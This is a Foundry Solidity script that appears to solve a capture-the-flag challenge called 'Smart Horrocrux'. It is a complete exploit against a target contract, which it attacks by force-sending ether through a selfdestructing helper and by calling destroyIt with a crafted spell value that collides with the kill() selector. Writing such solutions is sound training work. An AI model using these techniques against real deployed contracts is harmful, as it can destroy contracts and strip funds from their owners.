// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
interface ISmartHorrocrux {
    fallback() external;

    function alive() external view returns (bool);

    function destroyIt(string memory spell, uint256 magic) external;

    function kill() external;

    function setInvincible() external;
}

contract Destructable {
    constructor() payable {}

    function destroy(address payable addr) external {
        selfdestruct(addr);
    }
}
contract SmartHorrocruxScript is Script {
    ISmartHorrocrux horrocrux;

    address player = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
    function setUp() public {
        horrocrux = ISmartHorrocrux(0xef7Da1b02e4812E1d271AeC76a2A40ab23340Dc3);
    }
    function run() public {
        attack();
    }
    function attack() public {
        uint spell = 0x45746865724b6164616272610000000000000000000000000000000000000000;
        uint magic = spell - (0x41c0e1b5 << 224);
        
        // vm.startPrank(player, player);
        vm.startBroadcast(player);

        (bool success,) = address(horrocrux).call("");
        require(success);

        Destructable destructable = new Destructable{value: 1}();
        destructable.destroy(payable(address(horrocrux)));

        horrocrux.setInvincible();

        string memory spell_str = string(bytes("\x45\x74\x68\x65\x72\x4b\x61\x64\x61\x62\x72\x61\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"));
        horrocrux.destroyIt(spell_str, magic);

        // bytes32 spellInBytes;
        // assembly {
        //     spellInBytes := mload(add(spell_str, 32))
        // }
        // console.log("spellInBytes:", uint256(spellInBytes), magic);
        // uint diff = uint256(spellInBytes) - magic;
        // console.log("Diff:", diff);
    }
}
